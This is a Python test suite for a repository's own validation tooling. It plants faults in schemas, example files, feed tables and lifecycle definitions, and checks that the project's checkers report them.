"""The checks themselves must catch what they claim to catch.

`tree()` builds a throwaway repo holding a planted fault. `clone()` copies this repo and plants
one in the copy, so that a check is run from its front door and not only by its parts.
"""
from __future__ import annotations

import ast
import base64
import concurrent.futures
import contextlib
import copy
import hashlib
import importlib.machinery
import io
import json
import os
import pathlib
import re
import shutil
import subprocess
import sys
import tempfile
import time
import unittest
from unittest import mock

from kernel import decide as decide_module, derive, issue, terms
from kernel.decide import decide
from sim import world
from tests import support
from tools import (check_apps, check_authority, commits_are_the_maintainers, check_context, check_decisions, check_examples, check_lifecycle, context_eval,
                   check_purity, check_release, check_repo, check_rulesets, check_trials, check_workflows, mutants, needs_passed, redact_trial,
                   rulesets_drift, verify, walk)
from tools.hooks import protected
from tools.jsonschema_lite import SchemaError, validate

ROOT = check_authority.ROOT
GOOD = (ROOT / "examples" / "workflows" / "verify.yml").read_text()
# The poller's shim, as issue 196's ruling 4 gives it in full: the shape the rules shim and wake hold.
POLLER = 'name: sf-poller\non:\n  schedule:\n    - cron: "13 * * * *"\n    - cron: "33 * * * *"\n    - cron: "53 * * * *"\n  workflow_dispatch:\n  workflow_run:\n    workflows:\n      - factory\n      - ci\n      - sf-run\n    types:\n      - completed\npermissions: {}\njobs:\n  pass:\n    permissions:\n      actions: write\n      contents: read\n    concurrency:\n      group: sf-poller\n      cancel-in-progress: false\n    uses: combsmith/software-factory/.github/workflows/pass.yml@factory/v0-next\n'
STEP = "      - run: make verify\n"


SCRATCH = tempfile.TemporaryDirectory()     # removed when the run ends


def tree(files: dict) -> pathlib.Path:
    """A throwaway repo holding `files`, for a check to be run against."""
    root = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name))
    for rel, text in files.items():
        path = root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text)
    return root


def running_test():
    """The test case whose method is running, found up the stack; None outside one, as in setUpClass."""
    frame = sys._getframe(1)
    while frame is not None:
        case = frame.f_locals.get("self")
        if isinstance(case, unittest.TestCase):
            return case
        frame = frame.f_back
    return None


def clone(files: dict) -> pathlib.Path:
    """A copy of this repo with `files` written over it, removed when the test that made it ends (issue 344). A copy
    is the tree as `tools/walk.py` reads it, megabytes, with no other working tree in it; a run that kept every
    copy to its end held gigabytes, and a run killed before its end left them all behind."""
    made = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name))
    case = running_test()
    if case is not None:
        case.addCleanup(shutil.rmtree, str(made), True)
    root = made / "repo"
    walk.copy(ROOT, root)
    for rel, text in files.items():
        path = root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text)
    return root


def modules_in(suite) -> set:
    """The modules whose tests are in `suite`, at any depth."""
    found = set()
    for item in suite:
        if isinstance(item, unittest.TestSuite):
            found |= modules_in(item)
        else:
            found.add(type(item).__module__)
    return found


FILE, GITLINK = 0o100644, 0o160000


def git_index(paths: dict, version: int = 2) -> bytes:
    """git's index as git writes it, holding `paths` ({path: mode}). Version 3 marks every entry extended."""
    out, previous = b"", b""
    for path, mode in sorted(paths.items()):
        name = path.encode()
        flags = len(name) | (0x4000 if version == 3 else 0)
        entry = bytes(24) + mode.to_bytes(4, "big") + bytes(32) + flags.to_bytes(2, "big")
        entry += bytes(2) if version == 3 else b""
        if version == 4:    # the path is cut to what differs from the one before, and not padded
            same = len(os.path.commonprefix([previous, name]))
            entry += bytes([len(previous) - same]) + name[same:] + b"\0"
        else:
            entry += name + b"\0" * (8 - (len(entry) + len(name)) % 8)
        out, previous = out + entry, name
    data = b"DIRC" + version.to_bytes(4, "big") + len(paths).to_bytes(4, "big") + out
    return data + hashlib.sha1(data, usedforsecurity=False).digest()


def commit(root: pathlib.Path, paths: dict, version: int = 2) -> pathlib.Path:
    """Write git's index into `root`, as though `paths` had been committed. Returns `root`."""
    (root / ".git").mkdir(exist_ok=True)
    (root / ".git" / "index").write_bytes(git_index(paths, version))
    return root


def git(root: pathlib.Path, *args: str) -> str:
    """Run git in `root`, apart from this machine's configuration and any git that is running this."""
    env = {k: v for k, v in os.environ.items() if not k.startswith("GIT_")}
    env.update(GIT_CONFIG_GLOBAL=os.devnull, GIT_CONFIG_NOSYSTEM="1")
    return subprocess.run(["git", "-C", str(root), *args], env=env, check=True, capture_output=True, text=True).stdout


def staged(files: dict, *config: str, objects: str = "sha1") -> pathlib.Path:
    """A repo holding `files`, all added by git itself, after `config` ("key=value") is set. Nothing is committed."""
    root = tree(files)
    git(root, "init", "-q", "--object-format=" + objects)
    for setting in config:
        git(root, "config", *setting.split("=", 1))
    git(root, "add", "-f", ".")
    return root


def held_by_git(root: pathlib.Path) -> dict:
    """{path: mode} as git itself lists its index."""
    entries = (line.split("\t", 1) for line in git(root, "ls-files", "-s", "-z").split("\0") if line)
    return {path: int(meta.split()[0], 8) for meta, path in entries}


def checked(data: bytes) -> bytes:
    """`data`, an index without its last 20 bytes, with a SHA-1 of it put back."""
    return data + hashlib.sha1(data, usedforsecurity=False).digest()


def caught(problems: list, words: str) -> bool:
    return any(words in p for p in problems)


WALKS = {"walk", "fwalk", "rglob", "scandir", "copytree"}


def walkers(source: str) -> list:
    """(line, name) for each way `source` walks or copies a tree, read from its syntax, not its spelling."""
    found = []
    for node in ast.walk(ast.parse(source)):
        line = getattr(node, "lineno", 0)
        syntax = isinstance(node, ast.Attribute) and getattr(node.value, "id", "") == "ast"   # ast.walk
        if isinstance(node, ast.Attribute) and node.attr in WALKS and not syntax:
            found.append((line, node.attr))
        elif isinstance(node, ast.ImportFrom) and node.module != "tools":
            found += [(line, a.name) for a in node.names if a.name in WALKS]
        elif isinstance(node, ast.Call):
            name = getattr(node.func, "attr", getattr(node.func, "id", ""))
            if name in WALKS and isinstance(node.func, ast.Name):
                found.append((line, name))
            recursive = any(k.arg == "recursive" and not (isinstance(k.value, ast.Constant) and k.value.value is False)
                            for k in node.keywords)
            starred = any(isinstance(a, ast.Constant) and "**" in str(a.value) for a in node.args)
            if name in ("glob", "iglob") and (recursive or starred):
                found.append((line, name))
    return found


def rules(text: str) -> list:
    return sorted({rule for rule, _ in check_workflows.lint(text)})


class Validator(unittest.TestCase):
    def test_rejects_a_schema_it_cannot_enforce(self):
        with self.assertRaises(SchemaError):
            validate({}, {"type": "object", "patternProperties": {}})

    def test_a_boolean_is_not_an_integer(self):
        self.assertTrue(validate(True, {"type": "integer"}))

    def test_unexpected_property_is_an_error(self):
        schema = {"type": "object", "additionalProperties": False, "properties": {"a": {"type": "string"}}}
        self.assertEqual(validate({"a": "x", "b": 1}, schema), ["$: unexpected b"])

    def test_an_item_given_twice_is_an_error_where_items_are_unique(self):
        unique = {"type": "array", "uniqueItems": True}
        self.assertEqual(validate(["AC-1", "AC-2"], unique), [])
        self.assertEqual(validate(["AC-1", "AC-2", "AC-1"], unique), ["$: an item is given twice"])
        self.assertEqual(validate([{"a": 1, "b": 2}, {"b": 2, "a": 1}], unique), ["$: an item is given twice"])
        # The other side: without the keyword, or with it false, an item may come twice.
        for schema in ({"type": "array"}, {"type": "array", "uniqueItems": False}):
            self.assertEqual(validate(["AC-1", "AC-1"], schema), [])

    def test_a_code_that_ends_in_a_newline_is_not_a_code(self):
        code = {"type": "string", "pattern": "^[a-z_]+$"}
        self.assertEqual(validate("empty_diff", code), [])
        self.assertTrue(validate("empty_diff\n", code))

    def test_a_reference_to_another_schema_is_followed(self):  # decision 0038
        part = {"type": "object", "additionalProperties": False, "required": ["code"],
                "properties": {"code": {"$ref": "#/$defs/code"}},
                "$defs": {"code": {"type": "string", "pattern": "^[a-z_]+$"}, "kind": {"enum": ["a", "b"]}}}
        # The referrer has $defs of the same names and other shapes: a reference read against the wrong root shows.
        whole = {"type": "object", "additionalProperties": False,
                 "properties": {"part": {"$ref": "part.schema.json"}, "kind": {"$ref": "part.schema.json#/$defs/kind"}},
                 "$defs": {"code": {"type": "string", "pattern": "^[A-Z]+$"}, "kind": {"enum": ["c"]}}}
        schemas = {"part": part, "whole": whole}
        self.assertEqual(validate({"part": {"code": "fix_incomplete"}, "kind": "a"}, whole, schemas=schemas), [])
        self.assertEqual(validate({"part": {"code": "FIX"}}, whole, schemas=schemas),
                         ["$.part.code: does not match ^[a-z_]+$"])
        self.assertEqual(validate({"kind": "c"}, whole, schemas=schemas), ["$.kind: 'c' is not one of ['a', 'b']"])
        self.assertEqual(validate({"part": {"code": "fix_incomplete", "by": "x"}}, whole, schemas=schemas),
                         ["$.part: unexpected by"])

    def test_a_reference_to_a_schema_not_given_is_refused(self):  # decision 0038
        by_file = {"type": "object", "properties": {"a": {"$ref": "part.schema.json"}}, "additionalProperties": False}
        with self.assertRaises(SchemaError):
            validate({"a": {}}, by_file)
        with self.assertRaises(SchemaError):
            validate({"a": {}}, by_file, schemas={"other": {"type": "object", "additionalProperties": False}})
        with self.assertRaises(SchemaError):
            validate({}, {"$ref": "part.schema.json#/$defs/x"}, schemas={"part": {"$defs": {}}})
        with self.assertRaises(SchemaError):
            validate({}, {"$ref": "../part.schema.json"}, schemas={"part": {}})
        # A mapping that has it, by file or by fragment, is followed; nothing is read from disk for it.
        given = {"part": {"type": "object", "additionalProperties": False, "$defs": {"x": {"const": 1}}}}
        self.assertEqual(validate({"a": {}}, by_file, schemas=given), [])
        self.assertEqual(validate(1, {"$ref": "part.schema.json#/$defs/x"}, schemas=given), [])

    def test_a_reference_that_comes_round_to_itself_is_refused(self):  # decision 0038
        # A cycle of references consumes no value, so it would recurse without bound: it is refused as a SchemaError,
        # not left to crash. A reference reached again under a deeper value is not a cycle.
        schemas = {"a": {"$ref": "b.schema.json"}, "b": {"$ref": "a.schema.json"}}
        with self.assertRaises(SchemaError):
            validate({}, schemas["a"], schemas=schemas)
        local = {"$defs": {"x": {"$ref": "#/$defs/x"}}, "$ref": "#/$defs/x"}
        with self.assertRaises(SchemaError):
            validate(1, local)
        nested = {"type": "array", "items": {"$ref": "#/$defs/n"},
                  "$defs": {"n": {"type": "array", "items": {"$ref": "#/$defs/n"}}}}
        self.assertEqual(validate([[[]]], nested), [])
        self.assertTrue(validate([[1]], nested))

    def test_a_reference_with_keywords_beside_it_is_refused(self):  # decision 0038
        # The validator reads a $ref and nothing beside it, so a keyword beside one would be a promise nothing enforces.
        schema = {"$ref": "#/$defs/s", "enum": ["only"], "$defs": {"s": {"type": "string"}}}
        with self.assertRaises(SchemaError):
            validate("anything", schema)
        self.assertEqual(validate("anything", {"$ref": "#/$defs/s", "title": "an annotation is not a keyword",
                                               "$defs": {"s": {"type": "string"}}}), [])

    def test_a_schema_that_accepts_unknown_fields_is_caught(self):
        self.assertEqual(check_examples._open({"type": "object", "properties": {"a": {"type": "object"}}}),
                         ["$", "$.properties.a"])
        self.assertEqual(check_examples._open({"type": "object", "additionalProperties": {"type": "string"}}), [])
        for loose in (None, "no", {}, True):
            self.assertEqual(check_examples._open({"type": ["object", "null"], "additionalProperties": loose}), ["$"])

    def test_a_key_written_twice_is_refused(self):
        path = tree({"x.json": '{"limit": 3, "limit": 30}'}) / "x.json"
        with self.assertRaises(ValueError):
            check_examples._load(path)


class Examples(unittest.TestCase):
    def test_a_counter_example_that_is_accepted_is_caught(self):
        fine = (ROOT / "examples" / "facts.json").read_text()
        root = clone({"examples/invalid/facts.carries-prose.json": fine})
        self.assertTrue(caught(check_examples.run(root), "was accepted, and must be rejected"))

    def test_a_counter_example_wrong_in_two_ways_is_caught(self):
        facts = json.loads((ROOT / "examples" / "invalid" / "facts.carries-prose.json").read_text())
        facts["schema"] = "facts/2"
        root = clone({"examples/invalid/facts.carries-prose.json": json.dumps(facts)})
        self.assertTrue(caught(check_examples.run(root), "is wrong in 2 ways"))

    def test_an_example_that_does_not_validate_is_caught(self):
        self.assertTrue(caught(check_examples.run(clone({"examples/decision.json": "{}"})), "decision.json: $: missing"))

    def test_a_coverage_that_leaves_a_criterion_uncovered_is_caught(self):  # decision 0029
        # Valid to its schema, a coverage example is judged by kernel/coverage.py too, against the rubric, the Finding
        # example and the paths the facts example changes: no schema can say every criterion that applies is there.
        left = (ROOT / "examples" / "invalid" / "coverage.a-criterion-that-applies-left-out.json").read_text()
        whole = (ROOT / "examples" / "coverage.json").read_text()
        self.assertTrue(caught(check_examples.run(clone({"examples/coverage.json": left})),
                               "coverage.json: $: uncovered PR-4"))
        self.assertTrue(caught(check_examples.run(clone({"examples/invalid/coverage.a-criterion-that-applies-left-out"
                                                         ".json": whole})), "was accepted, and must be rejected"))
        problems = check_examples.run(clone({"examples/finding.json": "{}"}))
        self.assertTrue(caught(problems, "coverage.json: $: uncovered PR-3"))

    def test_a_string_that_is_neither_a_code_nor_a_body_is_caught(self):  # decision 0038
        # What one Run carries holds codes: a bare string, or a pattern not anchored at both ends, is text. The walk is
        # asked directly, since every mutant runs the whole suite; the check is run from its front door once.
        schemas = {p.name[: -len(".schema.json")]: json.loads(p.read_text())
                   for p in (ROOT / "schemas").glob("*.schema.json")}

        def free(kind: str, schema: dict) -> list:
            return check_examples._free(schema, dict(schemas, **{kind: schema}), schema, kind, "$", set())

        def disposition(**fields) -> dict:
            bare = copy.deepcopy(schemas["disposition"])
            for name, value in fields.items():
                (bare["properties"]["decision"]["properties"] if name == "reason" else bare["properties"])[name] = value
            return bare

        # A pattern anchored only in its writing is not anchored: an alternative outside the anchors, or an escaped $.
        for loose in ({"type": "string"}, {"type": "string", "pattern": "[a-z_]+"}, {"type": ["string", "null"]}, {},
                      {"type": "string", "pattern": "^fixed$|b$"}, {"type": "string", "pattern": "^[a-z]+\\$"}):
            self.assertTrue(caught(free("disposition", disposition(reason=loose)),
                                   "schema disposition admits text at $.decision.reason"), loose)
        problems = check_examples.run(clone({"schemas/disposition.schema.json":
                                             json.dumps(disposition(reason={"type": "string"}))}))
        self.assertTrue(caught(problems, "schema disposition admits text at $.decision.reason"))
        # A string in a schema a Run's schema reaches by reference is held the same way.
        coverage = copy.deepcopy(schemas["coverage"])
        del coverage["items"]["properties"]["reason"]["pattern"]
        result = schemas["result"]
        problems = check_examples._free(result, dict(schemas, coverage=coverage), result, "result", "$", set())
        self.assertTrue(caught(problems, "schema coverage admits text at $.coverage[].reason"))
        # A property named body is text, and passes: the Effect's comments, annotations and review body are.
        for kind in check_examples.CODES_ONLY:
            self.assertEqual(free(kind, schemas[kind]), [], kind)
        self.assertEqual(check_examples._free({"type": "object", "additionalProperties": False,
                                               "properties": {"body": {"type": "string"}}}, {}, {}, "x", "$", set()), [])
        # A reference the walk cannot follow is a problem too: validate() follows one only where a value reaches it.
        # So are a reference that comes round to itself, and a keyword beside one, in a branch no example takes.
        self.assertTrue(caught(free("disposition", disposition(note={"$ref": "nope.schema.json"})),
                               "schema disposition cannot be followed at $.note"))
        looped = disposition(note={"$ref": "#/$defs/loop"})
        looped["$defs"] = {"loop": {"$ref": "#/$defs/loop"}}
        self.assertTrue(caught(free("disposition", looped), "schema disposition comes round to itself at $.note"))
        self.assertTrue(caught(free("disposition", disposition(note={"$ref": "effect.schema.json", "enum": ["only"]})),
                               "schema disposition has ['enum'] beside a $ref at $.note"))
        for held in ("^(item|PRRT_[A-Za-z0-9_-]+)$", "^[^\\s]+$", "^a\\|b$", "^[|$]+$", "^(a|(b|c))$"):
            self.assertTrue(check_examples._anchored(held), held)
        for loose in ("^fixed$|b$", "^[a-z]+\\$", "^a|b$", "a$", "^a", "^(a|b)$|^c$", None, 3):
            self.assertFalse(check_examples._anchored(loose), loose)

    def test_a_schema_without_its_envelope_is_caught(self):  # decision 0039
        schemas = {p.name[: -len(".schema.json")]: json.loads(p.read_text())
                   for p in (ROOT / "schemas").glob("*.schema.json")}
        for kind, schema in sorted(schemas.items()):
            self.assertEqual(check_examples._envelope(kind, schema), [], kind)
        self.assertEqual(set(schemas), set(check_examples.ENVELOPE))
        # A document carries schema, its identity and release; a record or a data file schema alone; a part nothing.
        doc = copy.deepcopy(schemas["outcome"])
        del doc["properties"]["release"]
        doc["required"].remove("release")
        self.assertTrue(caught(check_examples._envelope("outcome", doc), "is a document and does not require release"))
        for run in ({"type": "string"}, {"type": ["string", "null"], "pattern": "^r_[0-9A-Z]{6,26}$"},
                    {"pattern": "^r_[0-9A-Z]{6,26}$"}):
            doc = copy.deepcopy(schemas["outcome"])
            doc["properties"]["run"] = run
            self.assertTrue(caught(check_examples._envelope("outcome", doc), "identity, run, is a string with a pattern"),
                            run)
        doc = copy.deepcopy(schemas["outcome"])
        del doc["properties"]["release"]["type"]
        self.assertTrue(caught(check_examples._envelope("outcome", doc), "release is a string in the Factory's release"))
        doc = copy.deepcopy(schemas["outcome"])
        doc["properties"]["schema"] = {"const": "result/1"}
        self.assertTrue(caught(check_examples._envelope("outcome", doc), "not a const naming outcome"))
        part = copy.deepcopy(schemas["effect"])
        part["properties"]["schema"] = {"const": "effect/1"}
        self.assertTrue(caught(check_examples._envelope("effect", part), "is a part, and carries a schema field"))
        part = copy.deepcopy(schemas["effect"])
        part["properties"]["release"] = {"type": "string", "pattern": check_examples.RELEASE}
        self.assertTrue(caught(check_examples._envelope("effect", part), "is a part, and carries a release"))
        for kind in ("decision", "config"):
            loose = copy.deepcopy(schemas[kind])
            loose["properties"]["release"] = {"type": "string"}
            self.assertTrue(caught(check_examples._envelope(kind, loose), "carries a release"))
            loose = copy.deepcopy(schemas[kind])
            loose["required"].remove("schema")
            self.assertTrue(caught(check_examples._envelope(kind, loose), "does not require its schema field"))
        self.assertTrue(caught(check_examples._envelope("unclassed", {"type": "object"}), "is in no class of ENVELOPE"))
        # From the front door: a schema in no class, and a class naming a kind with no schema.
        root = clone({"schemas/unclassed.schema.json": '{"type": "object", "additionalProperties": false}'})
        self.assertTrue(caught(check_examples.run(root), "schema unclassed is in no class of ENVELOPE"))
        with mock.patch.dict(check_examples.ENVELOPE, {"unclassed": "part"}):
            self.assertTrue(caught(check_examples.run(), "ENVELOPE names unclassed, and there is no such schema"))

    def test_text_is_let_through_only_untrusted_or_in_a_body(self):  # decision 0039
        marked = {"type": "object", "additionalProperties": False, "required": ["untrusted"],
                  "properties": {"untrusted": {"type": "object", "additionalProperties": False,
                                               "properties": {"title": {"type": "string"}}}}}
        self.assertEqual(check_examples._free(marked, {}, marked, "view-item", "$", set()), [])
        beside = copy.deepcopy(marked)
        beside["properties"]["title"] = {"type": "string"}
        self.assertTrue(caught(check_examples._free(beside, {}, beside, "view-item", "$", set()),
                               "schema view-item admits text at $.title"))
        # The feed's own schema holds its title so, and nothing else on it is text.
        schemas = {p.name[: -len(".schema.json")]: json.loads(p.read_text())
                   for p in (ROOT / "schemas").glob("*.schema.json")}
        item = schemas["view-item"]
        self.assertEqual(check_examples._free(item, schemas, item, "view-item", "$", set()), [])
        self.assertEqual(sorted(item["properties"]["untrusted"]["properties"]), ["title"])
        # Only the feed marks text untrusted: the same property in a Task, which goes to the model, is caught. And a
        # body is one string: an object of strings under that name is caught too.
        self.assertTrue(caught(check_examples._free(marked, {}, marked, "task", "$", set()),
                               "schema task admits text at $.untrusted.title"))
        boxed = {"type": "object", "additionalProperties": False,
                 "properties": {"body": {"type": "object", "additionalProperties": False,
                                         "properties": {"note": {"type": "string"}}}}}
        self.assertTrue(caught(check_examples._free(boxed, {}, boxed, "task", "$", set()),
                               "schema task admits text at $.body.note"))
        for kind in check_examples.CODES_ONLY:
            if kind != check_examples.UNTRUSTED_KIND:
                self.assertNotIn("untrusted", schemas[kind].get("properties", {}), kind)

    def test_the_example_pass_record_replays(self):  # decision 0039, decision 0002
        # Every Decision in the pass record is the Kernel's own answer on the facts, runs, context and time it holds,
        # with the Release's data files: the record is enough to replay a pass on a laptop.
        record = json.loads((ROOT / "examples" / "pass.json").read_text())
        issues = dict(support.CONFIG, lifecycle=json.loads((ROOT / "lifecycle" / "issue.json").read_text()))
        self.assertTrue(record["pull_requests"] and record["issues"])
        for entry in record["pull_requests"]:
            self.assertEqual(decide(entry["facts"], record["runs"], record["context"], support.CONFIG, record["now"]),
                             entry["decision"])
        for entry in record["issues"]:
            self.assertEqual(issue.decide(entry["facts"], record["runs"], record["context"], issues, record["now"]),
                             entry["decision"])
        # A Run id stands beside an admission or an approval, which is a Run, and is null anywhere else.
        for entry in record["pull_requests"] + record["issues"]:
            minted = entry["decision"]["outcome"] == "admit" or entry["decision"].get("action") == "issue_approval"
            self.assertEqual(entry["run"] is not None, minted, entry["decision"])

    def test_the_pass_record_holds_the_kernels_whole_context(self):  # decision 0039
        context = json.loads((ROOT / "schemas" / "pass.schema.json").read_text())["$defs"]["context"]
        self.assertEqual(set(context["properties"]), set(support.context()))
        self.assertEqual(set(context["required"]), set(support.context()))
        self.assertIs(context["additionalProperties"], False)

    def test_the_feed_shows_only_what_a_decision_can_say(self):  # decision 0039
        item = json.loads((ROOT / "schemas" / "view-item.schema.json").read_text())["properties"]
        pull = json.loads((ROOT / "schemas" / "decision.schema.json").read_text())["properties"]
        issue_ = json.loads((ROOT / "schemas" / "issue-decision.schema.json").read_text())["properties"]
        self.assertEqual(set(item["state"]["enum"]), set(pull["state"]["enum"]) | set(issue_["state"]["enum"]))
        self.assertEqual(item["attention"]["enum"], pull["attention"]["enum"])
        self.assertEqual(item["attention"]["enum"], issue_["attention"]["enum"])
        self.assertEqual(item["reason"], pull["reason"])

    def test_every_reason_that_needs_a_person_says_what_is_asked(self):  # decision 0039
        feed = json.loads((ROOT / "config" / "feed.json").read_text())
        schema = json.loads((ROOT / "schemas" / "decision.schema.json").read_text())
        self.assertEqual(check_examples._table(feed, schema), [])
        # The three reasons beside the Kernel's own sets are given needs_you by the Kernel.
        d = support.facts(queue=True, reviews=[support.review()], author="donpetry-bot")
        for paused, why in ((True, "paused"), (None, "pause_unreadable")):
            said = decide(d, [support.run()], support.context(paused=paused), support.CONFIG, support.NOW)
            self.assertEqual((said["reason"], said["attention"]), (why, "needs_you"))
        from tests import test_issue
        past = test_issue.facts(label_events=test_issue.READIED_BY_A_PERSON,
                                linked=test_issue.closed_links(*range(2, 3 + test_issue.LIMITS["max_unmerged_closes"])))
        said = issue.decide(past, [], support.context(), test_issue.config(), support.NOW)
        self.assertEqual((said["reason"], said["attention"]), ("unmerged_closes", "needs_you"))
        for reason in check_examples.ALSO_NEEDS_YOU:
            self.assertNotIn(reason, decide_module.NEEDS_YOU_REASONS | issue.NEEDS_YOU_REASONS)
        # Each fault: a row taken out, a row for a reason that never needs a person, a reason twice, a class unruled.
        broken = copy.deepcopy(feed)
        taken = broken["decision_required"].pop(0)
        self.assertTrue(caught(check_examples._table(broken, schema),
                               "the reason %s needs a person, and no row says what is asked" % taken["reason"]))
        broken = copy.deepcopy(feed)
        broken["decision_required"].append(dict(taken, reason="findings_open"))
        self.assertTrue(caught(check_examples._table(broken, schema), "a row for findings_open, a reason the Kernel never"))
        broken = copy.deepcopy(feed)
        broken["decision_required"].append(taken)
        self.assertTrue(caught(check_examples._table(broken, schema), "the reason %s has two rows" % taken["reason"]))
        broken = copy.deepcopy(feed)
        rule = broken["next_actor"]["by_attention"].pop(0)
        self.assertTrue(caught(check_examples._table(broken, schema), "class %s has no rule" % rule["attention"]))
        broken["next_actor"]["by_attention"] += [rule, rule]
        self.assertTrue(caught(check_examples._table(broken, schema), "class %s has two rules" % rule["attention"]))
        broken = copy.deepcopy(feed)
        broken["next_actor"]["by_state"]["rows"].append({"state": "queued", "actor": "lens"})
        broken["next_actor"]["by_outcome"].append({"outcome": ["admit"], "actor": "nobody"})
        problems = check_examples._table(broken, schema)
        self.assertTrue(caught(problems, "the State queued has two rules"))
        self.assertTrue(caught(problems, "the outcome admit has two rules"))
        # And from the front door, on the live file.
        root = clone({"config/feed.json": json.dumps(dict(feed, decision_required=feed["decision_required"][1:]))})
        self.assertTrue(caught(check_examples.run(root), "config/feed.json: feed: the reason"))

    def test_the_example_feed_follows_the_table(self):  # decision 0039
        feed = json.loads((ROOT / "config" / "feed.json").read_text())

        def next_actor(d: dict) -> str:
            for row in feed["next_actor"]["by_outcome"]:
                if d["outcome"] in row["outcome"]:
                    return row["actor"]
            actor = {row["attention"]: row["actor"] for row in feed["next_actor"]["by_attention"]}[d["attention"]]
            if actor != "by_state":
                return actor
            by_state = {row["state"]: row["actor"] for row in feed["next_actor"]["by_state"]["rows"]}
            return by_state.get(d["state"], feed["next_actor"]["by_state"]["default"])

        def decision_required(d: dict):
            if d["attention"] != "needs_you":
                return None
            row = {row["reason"]: row for row in feed["decision_required"]}[d["reason"]]
            return {"question": row["question"], "choices": row["choices"], "evidence": d["evidence"]}

        items = json.loads((ROOT / "examples" / "view-items.json").read_text())["items"]
        for item in items:
            codes = {"outcome": "nothing" if item["attention"] != "working" else "defer", **item}
            self.assertEqual(item["next_actor"], next_actor(codes), item["item"])
            self.assertEqual(item["decision_required"], decision_required(codes), item["item"])
        self.assertEqual({item["attention"] for item in items}, {"needs_you", "review"})
        # The table's own rules are the design's (section 8.4): a Decision about to admit or act is the Factory's, then
        # by class, then by State for the classes that wait on a Lens or the platform.
        for outcome in ("admit", "act"):
            self.assertEqual(next_actor({"outcome": outcome, "attention": "needs_you", "state": "held"}), "factory")
        for attention, actor in (("needs_you", "maintainer"), ("working", "factory"), ("failed", "author"), ("none", "nobody")):
            self.assertEqual(next_actor({"outcome": "nothing", "attention": attention, "state": "addressing"}), actor)
        for attention in ("review", "ready", "stale"):
            for state, actor in (("verifying", "lens"), ("adjudicating", "lens"), ("queued", "platform"),
                                 ("converged", "factory"), ("triage", "factory")):
                self.assertEqual(next_actor({"outcome": "defer", "attention": attention, "state": state}), actor)
        # A fact the Factory cannot read, or a Pause, is mended at its source, and a merge that landed while a person
        # had stopped the issue is answered only by undoing the stop, since a close would not move the State the person
        # put the issue in (issue 237); every other question can be closed.
        for row in feed["decision_required"]:
            mended = row["question"] in ("fact_unreadable", "paused", "configuration_needs_you", "merged_while_held",
                                         "merged_while_declined")
            self.assertEqual("close" in row["choices"], not mended, row["reason"])

    def test_each_effect_type_is_requested_by_its_own_list(self):  # decision 0038
        # With no oneOf, one list for each type is the only shape in which "a resolve_thread with no thread" is refused.
        effect = json.loads((ROOT / "schemas" / "effect.schema.json").read_text())
        self.assertEqual(sorted(effect["$defs"]["type"]["enum"]), sorted(effect["properties"]))
        self.assertEqual(effect["required"] if "required" in effect else [], [])
        for name, listed in sorted(effect["properties"].items()):
            self.assertEqual(listed["type"], "array", name)
            self.assertIs(listed["items"]["additionalProperties"], False, name)
            self.assertIn("id", listed["items"]["required"], name)
        # The Controller's acts are never a Result's Effects, and a review carries no event: approval is the act Run's.
        for act in ("add_label", "remove_label", "assign", "enqueue_merge", "dequeue_merge"):
            self.assertNotIn(act, effect["properties"])
        self.assertNotIn("event", effect["properties"]["submit_review"]["items"]["properties"])

    def test_only_success_can_pass_a_check(self):  # I-27, L-07
        # The configuration may say what a conclusion means, but never that one with no verdict has passed.
        schema = json.loads((ROOT / "schemas" / "config.schema.json").read_text())
        defaults = json.loads((ROOT / "config" / "defaults.json").read_text())
        self.assertEqual(validate(defaults, schema), [])
        for conclusion in sorted(set(defaults["check_conclusions"]) - {"success"}) + ["a_value_github_adds_later"]:
            for reading in ("passing", None, "", "ignored"):
                cfg = copy.deepcopy(defaults)
                cfg["check_conclusions"][conclusion] = reading
                self.assertTrue(validate(cfg, schema), (conclusion, reading))
        for reading in ("failing", "pending", "unreadable", "missing"):
            cfg = copy.deepcopy(defaults)
            if reading == "missing":
                del cfg["check_conclusions"]["success"]
            else:
                cfg["check_conclusions"]["success"] = reading
            self.assertTrue(validate(cfg, schema), reading)

    def test_a_schema_with_no_example_and_a_data_file_with_no_schema_are_caught(self):
        root = clone({"schemas/unclassed.schema.json": '{"type": "object", "additionalProperties": false}',
                      "config/extra.json": "{}", "examples/invalid/nothing.x.json": "{}"})
        problems = check_examples.run(root)
        self.assertTrue(caught(problems, "schema unclassed has no example"))
        self.assertTrue(caught(problems, "config/extra.json is validated against no schema"))
        broken = check_examples.run(clone({"examples/facts.json": '{"schema": "facts/1", "schema": "facts/1"}',
                                           "schemas/rubric.schema.json": "{not json"}))
        self.assertTrue(caught(broken, "examples/facts.json cannot be read: a key is written twice"))
        self.assertTrue(caught(broken, "schemas/rubric.schema.json cannot be read"))
        self.assertTrue(caught(broken, "config/rubric-pr-review.json: no schema named rubric"))
        self.assertTrue(caught(problems, "no schema named nothing"))


def unbound(lc: dict, bound: str) -> dict:
    """`lc` with `bound` taken off every transition that names it."""
    return dict(lc, transitions=[dict(tr, bound=None) if tr["bound"] == bound else tr for tr in lc["transitions"]])


class Lifecycle(unittest.TestCase):
    def test_an_unbounded_factory_cycle_is_caught(self):
        lc = copy.deepcopy(check_lifecycle.load())
        for tr in lc["transitions"]:
            if (tr["from"], tr["to"]) in (("adjudicating", "addressing"), ("addressing", "adjudicating")):
                tr["bound"] = None
        self.assertTrue(caught(check_lifecycle.check(lc), "a cycle with no person in it has no bound"))

    def test_a_dead_end_is_caught(self):
        lc = copy.deepcopy(check_lifecycle.load())
        lc["transitions"] = [tr for tr in lc["transitions"] if tr["from"] != "queued"]
        self.assertIn("no terminal state can be reached from: queued", check_lifecycle.check(lc))

    def test_a_hold_the_factory_could_end_is_caught(self):
        lc = copy.deepcopy(check_lifecycle.load())
        # L-02. A Hold ends when a person acts, or when the content that caused it changes; never by the Factory.
        self.assertIn(("held", "verifying", "platform"), {(tr["from"], tr["to"], tr["by"]) for tr in lc["transitions"]})
        lc["transitions"].append({"from": "held", "to": "verifying", "by": "factory", "bound": "max_attempts"})
        self.assertIn("the Factory makes no transition out of a Hold: held -> verifying is by factory",
                      check_lifecycle.check(lc))

    def test_an_issue_the_factory_could_serve_again_is_caught(self):
        lc = copy.deepcopy(check_lifecycle.load("issue"))
        lc["transitions"].append({"from": "not_served", "to": "ready", "by": "factory", "bound": None})
